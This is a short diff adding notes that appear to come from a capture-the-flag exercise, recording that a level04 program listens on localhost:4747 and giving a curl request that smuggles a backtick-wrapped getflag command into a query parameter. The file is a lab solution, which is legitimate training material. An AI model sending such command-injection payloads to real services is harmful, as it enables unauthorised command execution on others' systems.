@@ -1,0 +1,4 @@
+* the program level04 listen localhost:4747
+
+- curl 'localhost:4747?x=`getflag`'
+
